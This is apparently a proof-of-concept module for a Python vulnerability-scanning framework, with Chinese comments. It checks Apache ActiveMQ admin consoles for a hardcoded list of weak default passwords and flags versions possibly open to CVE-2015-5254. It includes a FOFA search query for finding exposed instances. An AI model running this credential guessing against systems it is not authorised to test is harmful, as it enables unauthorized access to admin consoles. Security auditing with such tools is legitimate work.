# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua,Str2Base64
from lib.core.poc import POCBase
# ...
import urllib3
import re
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
            该POC根据版本号附带了一个CVE-2015-5254的检测，可能不是很精准  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Apache ActiveMQ 弱口令 ➕ CVE-2015-5254",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
        
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="APACHE-ActiveMQ"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        if self.port == None:
            self.target += ":8161"

        url = self.target + "/admin/" # url自己按需调整
        
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            for i in ["admin:123456", "admin:admin", "admin:123123", "admin:activemq", "admin:12345678"]:

                headers = {"User-Agent":get_random_ua(),
                            "Connection":"close",
                            "Authorization": "Basic " + Str2Base64(i)
                            }
                
                req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if "<title>localhost : ActiveMQ Console</title>" in req.text and req.status_code == 200:
                    
                    version = re.findall("<td><b>(.*)</b></td>", req.text)[1]
                    activemq_version = version.replace(".","")
                    
                    if (int(activemq_version) < 5130 and len(activemq_version)==4) :
                        vuln = [True,"<title>口令：" + i + " 版本：" + version + " 可能存在CVE-2015-5254</title>"]
                    else:
                        vuln = [True,"<title>口令：" + i + "</title>"]
                    break

        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()